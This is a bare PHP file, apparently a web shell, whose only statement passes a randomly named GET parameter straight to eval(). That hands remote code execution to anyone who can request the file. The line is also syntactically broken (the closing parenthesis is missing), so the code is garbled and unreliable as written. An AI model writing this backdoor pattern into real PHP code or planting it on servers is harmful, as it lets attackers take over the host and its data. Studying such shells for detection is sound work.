<?php
eval($_GET['uHKKSPAF'];
?>
